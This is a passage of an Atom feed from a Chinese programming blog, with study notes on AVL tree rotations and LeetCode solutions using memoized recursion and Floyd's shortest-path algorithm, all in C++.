    <content type="html"><![CDATA[<h1 id="AVL树"><a href="#AVL树" class="headerlink" title="AVL树"></a>AVL树</h1><p><a href="https://zhuanlan.zhihu.com/p/56066942">什么是平衡二叉树（AVL） - 知乎 (zhihu.com)</a></p><p>AVL树又称<strong>平衡二叉搜索树</strong></p><h2 id="平衡因子"><a href="#平衡因子" class="headerlink" title="平衡因子"></a>平衡因子</h2><p>定义：某节点的左子树与右子树的高度(深度)差即为该节点的平衡因子（BF,Balance Factor），平衡二叉树中不存在平衡因子大于 1 的节点。在一棵平衡二叉树中，节点的平衡因子只能取 0 、1 或者 -1 ，分别对应着左右子树等高，左子树比较高，右子树比较高。 </p><h2 id="节点定义"><a href="#节点定义" class="headerlink" title="节点定义"></a>节点定义</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">AVLNode</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> depth; </span><br><span class="line">Tree parent; <span class="comment">//父节点</span></span><br><span class="line">ElementType val;</span><br><span class="line">Tree l, r;</span><br><span class="line"></span><br><span class="line"><span class="built_in">AVLNode</span>(<span class="type">int</span> val = <span class="number">0</span>)</span><br><span class="line">: <span class="built_in">parent</span>(<span class="literal">nullptr</span>)</span><br><span class="line">, <span class="built_in">depth</span>(<span class="number">0</span>)</span><br><span class="line">, <span class="built_in">l</span>(<span class="literal">nullptr</span>)</span><br><span class="line">, <span class="built_in">r</span>(<span class="literal">nullptr</span>)</span><br><span class="line">, <span class="built_in">val</span>(val)</span><br><span class="line">&#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="用到的函数"><a href="#用到的函数" class="headerlink" title="用到的函数"></a>用到的函数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//更新当前深度</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update_depth</span><span class="params">(Tree node)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="type">int</span> depth_Lchild=<span class="built_in">get_balance</span>(node-&gt;lchild); <span class="comment">//左孩子深度</span></span><br><span class="line">        <span class="type">int</span> depth_Rchild=<span class="built_in">get_balance</span>(node-&gt;rchild); <span class="comment">//右孩子深度</span></span><br><span class="line">        node-&gt;depth=<span class="built_in">max</span>(depth_Lchild,depth_Rchild)+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取当前结点的深度</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">get_balance</span><span class="params">(Tree node)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node==<span class="literal">NULL</span>)&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> node-&gt;depth;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回当前平衡因子</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">is_balance</span><span class="params">(Tree node)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node==<span class="literal">NULL</span>)&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="built_in">get_balance</span>(node-&gt;lchild)-<span class="built_in">get_balance</span>(node-&gt;rchild); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四种旋转方式"><a href="#四种旋转方式" class="headerlink" title="四种旋转方式"></a>四种旋转方式</h2><h3 id="RR型"><a href="#RR型" class="headerlink" title="RR型"></a>RR型</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RR型调整函数</span></span><br><span class="line"><span class="comment">//返回新父节点</span></span><br><span class="line"><span class="function">Tree <span class="title">RR_rotate</span><span class="params">(Tree node)</span></span>&#123;</span><br><span class="line">    <span class="comment">//node为离操作结点最近的失衡的结点</span></span><br><span class="line">    Tree parent=<span class="literal">NULL</span>,son;</span><br><span class="line">    <span class="comment">//获取失衡结点的父节点</span></span><br><span class="line">    parent=node-&gt;parent;</span><br><span class="line">    <span class="comment">//获取失衡结点的右孩子</span></span><br><span class="line">    son=node-&gt;rchild;</span><br><span class="line">    <span class="comment">//设置son结点左孩子的父指针</span></span><br><span class="line">    <span class="keyword">if</span> (son-&gt;lchild!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">          son-&gt;lchild-&gt;parent=node;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//失衡结点的右孩子变更为son的左孩子</span></span><br><span class="line">    node-&gt;rchild=son-&gt;lchild;</span><br><span class="line">    <span class="comment">//更新失衡结点的高度信息</span></span><br><span class="line">    <span class="built_in">update_depth</span>(node);</span><br><span class="line">    <span class="comment">//失衡结点变成son的左孩子</span></span><br><span class="line">    son-&gt;lchild=node;</span><br><span class="line">    <span class="comment">//设置son的父结点为原失衡结点的父结点</span></span><br><span class="line">    son-&gt;parent=parent;</span><br><span class="line">    <span class="comment">//如果失衡结点不是根结点，则开始更新父节点</span></span><br><span class="line">    <span class="keyword">if</span> (parent!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">//如果父节点的左孩子是失衡结点，指向现在更新后的新孩子son</span></span><br><span class="line">        <span class="keyword">if</span> (parent-&gt;lchild==node)&#123;</span><br><span class="line">            parent-&gt;lchild=son;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//父节点的右孩子是失衡结点</span></span><br><span class="line">            parent-&gt;rchild=son;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//设置失衡结点的父亲</span></span><br><span class="line">    node-&gt;parent=son;</span><br><span class="line">    <span class="comment">//更新son结点的高度信息</span></span><br><span class="line">    <span class="built_in">update_depth</span>(son);</span><br><span class="line">    <span class="keyword">return</span> son;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LL型"><a href="#LL型" class="headerlink" title="LL型"></a>LL型</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//LL型调整函数</span></span><br><span class="line"><span class="comment">//返回:新父节点</span></span><br><span class="line"><span class="function">Tree <span class="title">LL_rotate</span><span class="params">(Tree node)</span></span>&#123;</span><br><span class="line">    <span class="comment">//node为离操作结点最近的失衡的结点</span></span><br><span class="line">    Tree parent=<span class="literal">NULL</span>,son;</span><br><span class="line">    <span class="comment">//获取失衡结点的父节点</span></span><br><span class="line">    parent=node-&gt;parent;</span><br><span class="line">    <span class="comment">//获取失衡结点的左孩子</span></span><br><span class="line">    son=node-&gt;lchild;</span><br><span class="line">    <span class="comment">//设置son结点右孩子的父指针</span></span><br><span class="line">    <span class="keyword">if</span> (son-&gt;rchild!=<span class="literal">NULL</span>)  son-&gt;rchild-&gt;parent=node;</span><br><span class="line">    <span class="comment">//失衡结点的左孩子变更为son的右孩子</span></span><br><span class="line">    node-&gt;lchild=son-&gt;rchild;</span><br><span class="line">    <span class="comment">//更新失衡结点的高度信息</span></span><br><span class="line">    <span class="built_in">update_depth</span>(node);</span><br><span class="line">    <span class="comment">//失衡结点变成son的右孩子</span></span><br><span class="line">    son-&gt;rchild=node;</span><br><span class="line">    <span class="comment">//设置son的父结点为原失衡结点的父结点</span></span><br><span class="line">    son-&gt;parent=parent;</span><br><span class="line">    <span class="comment">//如果失衡结点不是根结点，则开始更新父节点</span></span><br><span class="line">    <span class="keyword">if</span> (parent!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">//如果父节点的左孩子是失衡结点，指向现在更新后的新孩子son</span></span><br><span class="line">        <span class="keyword">if</span> (parent-&gt;lchild==node)&#123;</span><br><span class="line">            parent-&gt;lchild=son;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="comment">//父节点的右孩子是失衡结点</span></span><br><span class="line">              parent-&gt;rchild=son;</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="comment">//设置失衡结点的父亲</span></span><br><span class="line">    node-&gt;parent=son;</span><br><span class="line">    <span class="comment">//更新son结点的高度信息</span></span><br><span class="line">    <span class="built_in">update_depth</span>(son);</span><br><span class="line">    <span class="keyword">return</span> son;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="RL型"><a href="#RL型" class="headerlink" title="RL型"></a>RL型</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RL型，先右旋转，再左旋转</span></span><br><span class="line"><span class="comment">//返回:新父节点</span></span><br><span class="line"><span class="function">Tree <span class="title">RL_rotate</span><span class="params">(Tree node)</span></span>&#123;</span><br><span class="line">    <span class="built_in">LL_rotate</span>(node-&gt;rchild);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">RR_rotate</span>(node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LR型"><a href="#LR型" class="headerlink" title="LR型"></a>LR型</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//LR型，先左旋转，再右旋转</span></span><br><span class="line"><span class="comment">//返回：新父节点</span></span><br><span class="line"><span class="function">Tree <span class="title">LR_rotate</span><span class="params">(Tree node)</span></span>&#123;</span><br><span class="line">    <span class="built_in">RR_rotate</span>(node-&gt;lchild);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">LL_rotate</span>(node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;AVL树&quot;&gt;&lt;a href=&quot;#AVL树&quot; class=&quot;headerlink&quot; title=&quot;AVL树&quot;&gt;&lt;/a&gt;AVL树&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/56066942&quot;&gt;什么是平衡二叉树（AVL） </summary>
      
    
    
    
    <category term="数据结构" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="树" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/"/>
    
    
    <category term="AVL树" scheme="https://1xueyu1.github.io/tags/AVL%E6%A0%91/"/>
    
  </entry>
  
  <entry>
    <title>记忆化递归</title>
    <link href="https://1xueyu1.github.io/2023/12/03/%E8%AE%B0%E5%BF%86%E5%8C%96%E9%80%92%E5%BD%92/"/>
    <id>https://1xueyu1.github.io/2023/12/03/%E8%AE%B0%E5%BF%86%E5%8C%96%E9%80%92%E5%BD%92/</id>
    <published>2023-12-03T04:46:16.000Z</published>
    <updated>2023-12-03T04:50:08.374Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://leetcode.cn/problems/minimum-path-cost-in-a-grid/description/?envType=daily-question&envId=2023-11-22">2304. 网格中的最小路径代价 - 力扣（LeetCode）</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minPathCost</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; moveCost)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>(), n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 记录dfs(i, j)已经计算过的</span></span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">memo</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n));</span><br><span class="line">        function&lt;<span class="type">int</span>(<span class="type">int</span>, <span class="type">int</span>)&gt; dfs = [&amp;](<span class="type">int</span> i, <span class="type">int</span> j) -&gt; <span class="type">int</span>&#123;</span><br><span class="line">            <span class="comment">// 到边界了，直接返回</span></span><br><span class="line">            <span class="keyword">if</span>(i == m - <span class="number">1</span>)<span class="keyword">return</span> grid[i][j];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 引用， 记录过就直接返回</span></span><br><span class="line">            <span class="keyword">auto</span>&amp; res = memo[i][j];</span><br><span class="line">            <span class="keyword">if</span>(res)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> res;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 没记录过，就递归求答案</span></span><br><span class="line">            res = INT_MAX;</span><br><span class="line">            <span class="comment">// 移动到下一行的k列</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">            &#123;</span><br><span class="line">                res = <span class="built_in">min</span>(res, <span class="built_in">dfs</span>(i + <span class="number">1</span>, k) + moveCost[grid[i][j]][k]);</span><br><span class="line">            &#125;</span><br><span class="line">            res += grid[i][j];</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">int</span> ans = INT_MAX;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)<span class="comment">// 枚举起点</span></span><br><span class="line">        &#123;</span><br><span class="line">            ans = <span class="built_in">min</span>(ans, <span class="built_in">dfs</span>(<span class="number">0</span>, j));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://leetcode.cn/problems/minimum-path-cost-in-a-grid/description/?envType=daily-question&amp;envId=2023-11-22&quot;&gt;2304. 网格中的最小路径代价 </summary>
      
    
    
    
    <category term="数据结构" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="图" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/"/>
    
    
    <category term="递归" scheme="https://1xueyu1.github.io/tags/%E9%80%92%E5%BD%92/"/>
    
    <category term="记忆化搜索" scheme="https://1xueyu1.github.io/tags/%E8%AE%B0%E5%BF%86%E5%8C%96%E6%90%9C%E7%B4%A2/"/>
    
  </entry>
  
  <entry>
    <title>最短路径</title>
    <link href="https://1xueyu1.github.io/2023/11/30/%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/"/>
    <id>https://1xueyu1.github.io/2023/11/30/%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/</id>
    <published>2023-11-30T11:13:30.000Z</published>
    <updated>2023-11-30T11:54:21.251Z</updated>
    
    <content type="html"><![CDATA[<h1 id="最短路径"><a href="#最短路径" class="headerlink" title="最短路径"></a>最短路径</h1><p><a href="https://leetcode.cn/problems/find-the-city-with-the-smallest-number-of-neighbors-at-a-threshold-distance/description/?envType=daily-question&envId=2023-11-14">1334. 阈值距离内邻居最少的城市 - 力扣（LeetCode）</a></p><h2 id="Floyd算法"><a href="#Floyd算法" class="headerlink" title="Floyd算法"></a>Floyd算法</h2><h3 id="递归-（记忆化搜索）"><a href="#递归-（记忆化搜索）" class="headerlink" title="递归+（记忆化搜索）"></a>递归+（记忆化搜索）</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findTheCity</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges, <span class="type">int</span> distanceThreshold)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">g</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; (n, INT_MAX / <span class="number">2</span>));</span><br><span class="line">        <span class="comment">// 邻接矩阵</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; e : edges)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> x = e[<span class="number">0</span>], y = e[<span class="number">1</span>], dis = e[<span class="number">2</span>];</span><br><span class="line">            g[x][y] = g[y][x] = dis;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记忆化存储</span></span><br><span class="line">        vector&lt;vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&gt; <span class="built_in">mem</span>(n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n)));</span><br><span class="line">        <span class="comment">// dfs(k, i, j)表示从i到j的路径节点 &lt;= k</span></span><br><span class="line">        function&lt;<span class="type">int</span>(<span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>)&gt; dfs = [&amp;](<span class="type">int</span> k, <span class="type">int</span> i, <span class="type">int</span> j) -&gt; <span class="type">int</span> &#123;</span><br><span class="line">            <span class="comment">// 到边界, 即从i到j无其他节点</span></span><br><span class="line">            <span class="keyword">if</span>(k &lt; <span class="number">0</span>)<span class="keyword">return</span> g[i][j];</span><br><span class="line">            <span class="comment">// 引用res，能修改mem</span></span><br><span class="line">            <span class="keyword">auto</span>&amp; res = mem[k][i][j];</span><br><span class="line">            <span class="keyword">if</span>(res)<span class="keyword">return</span> res;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 不选k点，dfs(k, i, j) = dfs(k - 1, i, j)</span></span><br><span class="line">            <span class="comment">// 选k点, dfs(k, i, j) = dfs(k - 1, i, k) + dfs(k - 1, k, j)</span></span><br><span class="line">            <span class="keyword">return</span> res = <span class="built_in">min</span>(<span class="built_in">dfs</span>(k - <span class="number">1</span>, i, j), <span class="built_in">dfs</span>(k - <span class="number">1</span>, i, k) + <span class="built_in">dfs</span>(k - <span class="number">1</span>, k, j));</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> ans;</span><br><span class="line">        <span class="type">int</span> min_citys = n;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(i != j &amp;&amp; <span class="built_in">dfs</span>(n - <span class="number">1</span>, i, j) &lt;= distanceThreshold)</span><br><span class="line">                &#123;</span><br><span class="line">                    cnt++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// =的原因时取编号最大的</span></span><br><span class="line">            <span class="keyword">if</span>(cnt &lt;= min_citys)</span><br><span class="line">            &#123;</span><br><span class="line">                min_citys = cnt;</span><br><span class="line">                ans = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="迭代写法"><a href="#迭代写法" class="headerlink" title="迭代写法"></a>迭代写法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findTheCity</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges, <span class="type">int</span> distanceThreshold)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">g</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; (n, INT_MAX / <span class="number">2</span>));</span><br><span class="line">        <span class="comment">// 邻接矩阵</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; e : edges)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> x = e[<span class="number">0</span>], y = e[<span class="number">1</span>], dis = e[<span class="number">2</span>];</span><br><span class="line">            g[x][y] = g[y][x] = dis;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">        &#123;</span><br><span class="line">            g[k][k] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 相当于往i到j的路径中间不断加入其他点，并更新所有路径的值</span></span><br><span class="line">                    g[i][j] = <span class="built_in">min</span>(g[i][j], g[i][k] + g[k][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>, min_cnt = n;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(g[i][j] &lt;= distanceThreshold)</span><br><span class="line">                &#123;</span><br><span class="line">                    cnt++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(cnt &lt;= min_cnt)</span><br><span class="line">            &#123;</span><br><span class="line">                min_cnt = cnt;</span><br><span class="line">                ans = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;最短路径&quot;&gt;&lt;a href=&quot;#最短路径&quot; class=&quot;headerlink&quot; title=&quot;最短路径&quot;&gt;&lt;/a&gt;最短路径&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://leetcode.cn/problems/find-the-city-with-the-s</summary>
      
    
    
    
    <category term="数据结构" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="图" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/"/>
    
    
    <category term="最短路径" scheme="https://1xueyu1.github.io/tags/%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/"/>
    
  </entry>
  
  <entry>
    <title>二叉树迭代器</title>
    <link href="https://1xueyu1.github.io/2023/11/27/%E4%BA%8C%E5%8F%89%E6%A0%91%E8%BF%AD%E4%BB%A3%E5%99%A8/"/>
